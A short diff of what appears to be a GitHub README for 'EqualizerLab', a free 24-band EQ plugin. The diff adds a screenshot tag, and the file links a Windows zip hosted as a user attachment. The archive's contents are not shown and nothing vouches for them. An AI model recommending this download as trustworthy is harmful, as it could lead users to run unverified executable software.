@@ -1,6 +1,9 @@
 
 [EqualizerLab-Windows.zip](https://github.com/user-attachments/files/33684630/EqualizerLab-Windows.zip)
 
+<img width="1100" height="680" alt="main" src="https://github.com/user-attachments/assets/0af7c293-6b14-4d5b-8fdf-94f6d72f878c" />
+
+
 **EQUALIZERLAB**
 Free 24-band EQ for every major DAW
 
